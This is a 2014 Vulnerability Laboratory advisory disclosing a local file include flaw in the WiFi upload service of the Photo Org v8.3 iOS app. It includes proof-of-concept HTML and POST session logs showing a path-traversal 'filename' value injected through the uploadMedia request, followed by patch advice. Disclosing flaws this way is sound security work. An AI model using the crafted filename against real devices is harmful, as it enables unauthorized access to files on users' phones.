Document Title:
===============
Photo Org WonderApplications v8.3 iOS - File Include Vulnerability


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1277


Release Date:
=============
2014-07-04


Vulnerability Laboratory ID (VL-ID):
====================================
1277


Common Vulnerability Scoring System:
====================================
7.1


Product & Service Introduction:
===============================
Create great photo albums and video diaries with PhotoOrg. Keep your photo album and video diary secured with passwords.
Share your photo albums and video diary on Facebook, Twitter, Youtube, Picasa, Flickr and MySpace with family, friends
and business associates.

Photo Editor with the following ability:
-Over eleven photo effects
-Four different photo enhancer
-Rotate and flip photo
-Crop photo
-Change photo brightness
-Change photo Contrast
-Change photo saturation
-Change photo sharpness
-Draw on photo with different colors
-Write text on your photo
-Remove red eyes
-Whiten photo
-Remove blemish on photo

Features:
-view your pictures and videos using your browser
-upload your picture and video using your browser
-upload video to Youtube, Picasa, Facebook, Twitter, Flickr and MySpace
-upload multiple pictures to Facebook, Twitter, Flickr and MySpace
-Keep your photo and videos organized the way you like it
-Keep your photo and video secured with password
-copy your photo and video from anywhere and paste them into the application


( Copy of the Homepage: https://itunes.apple.com/us/app/photo-org/id330740156 )


Abstract Advisory Information:
==============================
The Vulnerability Laboratory Research Team discovered a local file include vulnerability in the official WonderApplications Photo Org v8.3 iOS web-application.


Vulnerability Disclosure Timeline:
==================================
2014-07-04: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
WonderApplications
Product: Photo Org L - iOS Mobile Application 8.3


Exploitation Technique:
=======================
Local


Severity Level:
===============
High


Technical Details & Description:
================================
A local file include web vulnerability has been discovered in the official WonderApplications Photo Org v8.3 iOS web-application.
The local file include web vulnerability allows remote attackers to unauthorized include local file/path requests or system specific
path commands to compromise the mobile web-application.

The web vulnerability is located in the `filename` value of the `uploadMedia` (uploadfile) module. Remote attackers are able to inject
own files with malicious `filename` values in the `uploadMedia` POST method request to compromise the mobile web-application. The local
file/path include execution occcurs in the index file/folder list context next to the vulnerable name/path value. The attacker is able
to inject the local file request by usage of the available `wifi interface` for file exchange/share.

Remote attackers are also able to exploit the filename validation issue in combination with persistent injected script codes to execute
different local malicious attacks requests. The attack vector is on the application-side of the wifi service and the request method to
inject is POST.

The security risk of the local file include web vulnerability is estimated as high with a cvss (common vulnerability scoring system)
count of 7.1. Exploitation of the local file include web vulnerability requires no privileged web-application user account but low
user interaction. Successful exploitation of the local file include web vulnerability results in mobile application or connected
device component compromise.


Request Method(s):
				[+] [POST]

Vulnerable Service(s):
				[+] WonderApplications - WiFi Share

Vulnerable Module(s):
				[+] uploadMedia

Vulnerable Parameter(s):
				[+] filename

Affected Module(s):
				[+] Index File/Folder Dir Listing (http://localhost:[port-x]/)


Proof of Concept (PoC):
=======================
The local file inlcude web vulnerability can be exploited by remote attackers with low privileged application user account and without user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.


PoC: WonderApplications (Photo & Video) - Index- & Sub-Categories

<html><head><style type="text/css">
ul {float:left; width:100%; padding:0; margin:0; list-style-type:none; }
a { float:left; width:6em; text-decoration:none; color:white; background-color:purple; padding:0.2em 0.6em; border-right:1px solid white; }
a:hover {background-color:#ff3300} 	 li {display:inline}      table {float:left} 	 </style></head>
<body><h1 style="color:orange;text-align:center">WonderApplications</h1><ul> 	 <li><a href="Photo_33457298432">Foto</a></li>
<li><a href="Video_33457298432">Video</a></li> 	 <li><a href="Load_33457298432">Load</a></li> 	 </ul><table border="1"><tbody><tr><td>
<a href="abcde"><img src="http://localhost:8080/var/mobile/Applications/FB0FAD2F-8D06-4485-879B-0452C05067EC/Documents/mediaPath/00/C01FCCB0-DBDA-4A80-8C6A-67F02D3FE0A9.PNG" alt="abcde"></a>
<br \=""> abcde </td><td> <a href="abcdef ././/var/mobile/Applications/[LOCAL FILE INCLUDE VULNERABILITY!].png.zip">
<img src="http://localhost:8080/././/var/mobile/Applications/[LOCAL FILE INCLUDE VULNERABILITY!].png.zip/
FB0FAD2F-8D06-4485-879B-0452C05067EC/Documents/mediaPath/00/6EFCA2A7-E8F8-4251-8EFB-85EF327998FF.PNG"
alt="abcdef <././/var/mobile/Applications/[LOCAL FILE INCLUDE VULNERABILITY!].png.zip"></a> <br \="">
abcdef <././/var/mobile/Applications/[LOCAL FILE INCLUDE VULNERABILITY!].png.zip">
</td></table></body></html></iframe></td></tr></tbody></table></body></html>


--- Poc Session Logs [POST] ---
Status: 200[OK]
POST http://localhost:8080/uploadMedia Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Gr��e des Inhalts[unknown] Mime Type[unknown]
   Request Header:
      Host[localhost:8080]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      Referer[http://localhost:8080/uploadMedia]
   POST-Daten:
      POST_DATA[-----------------------------276732337522317
Content-Disposition: form-data; name="file"; filename="././/var/mobile/Applications/[LOCAL FILE INCLUDE VULNERABILITY!].png.zip"
Content-Type: application/zip
-

20:40:52.394[62ms][total 79ms] Status: 200[OK]
GET http://localhost:8080/ Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Gr��e des Inhalts[2874] Mime Type[text/html]
   Request Header:
      Host[localhost:8080]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      Connection[keep-alive]
   Response Header:
      Connection[Keep-Alive]
      Content-Type[text/html]
      Content-Length[2874]




Reference(s):
http://localhost:8080/
http://localhost:8080/uploadMedia
http://localhost:8080/var/mobile/Applications/


Solution - Fix & Patch:
=======================
The local file include web vulnerability bug can be patched by a secure parse and encode of the vulnerable filename value in the upload POST method request.
Encode also the filename value in the file dir listing of the index and sub categories.
Restrict the filename value name input and prevent executions by a secure file filter on upload extension or the name validation itself.


Security Risk:
==============
The security risk of the local file include web vulnerability in the filename value is estimated as high.


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either
expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers
are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even
if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation
of liability for consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break
any vendor licenses, policies, deface websites, hack into databases or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com
Section:    dev.vulnerability-db.com	 	- forum.vulnerability-db.com 		       		- magazine.vulnerability-db.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to
electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website
is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact
(admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.

				Copyright � 2014 | Vulnerability Laboratory [Evolution Security]


--
VULNERABILITY LABORATORY RESEARCH TEAM
DOMAIN: www.vulnerability-lab.com
CONTACT: research@vulnerability-lab.com